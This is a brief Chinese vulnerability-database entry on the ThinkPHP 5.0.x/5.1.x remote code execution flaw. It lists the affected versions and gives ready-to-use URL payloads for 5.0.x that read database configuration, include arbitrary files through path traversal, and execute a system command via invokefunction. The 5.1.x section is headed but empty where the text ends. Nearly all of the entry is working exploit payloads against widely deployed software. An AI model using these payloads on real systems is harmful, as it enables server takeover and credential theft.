---
title: 'Thinkphp 5.0.(7-22)&5.1.(0-30)远程代码执行漏洞'
date: Wed, 14 Oct 2020 06:15:24 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞影响

5.0.7<=ThinkPHP5<=5.0.22 5.1.0<=ThinkPHP<=5.1.30

### 漏洞POC

5.0.x```
?s=index/think\config/get&name=database.username # 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id 
```5.1.x